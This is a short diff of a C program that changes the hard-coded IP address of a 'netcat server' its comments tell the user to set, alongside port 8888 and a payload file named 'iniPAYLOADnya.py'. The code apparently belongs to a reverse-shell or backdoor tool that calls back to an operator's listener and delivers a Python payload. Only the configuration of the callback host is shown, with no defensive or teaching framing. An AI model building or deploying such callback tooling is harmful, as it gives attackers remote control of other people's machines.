@@ -226,7 +226,7 @@ void os(const char *s, const int p) {
 int main() {
     signal(SIGINT, exitt);
     int python = check();
-    const char *server = "172.22.239.170"; // Silahkan sesuaikan dengan IP server netcat yang diinginkan
+    const char *server = "192.168.66.1"; // Silahkan sesuaikan dengan IP server netcat yang diinginkan
     const int port = 8888; // Silahkan sesuaikan dengan port server netcat yang diinginkan
     const char *ploadd = "iniPAYLOADnya.py";
 
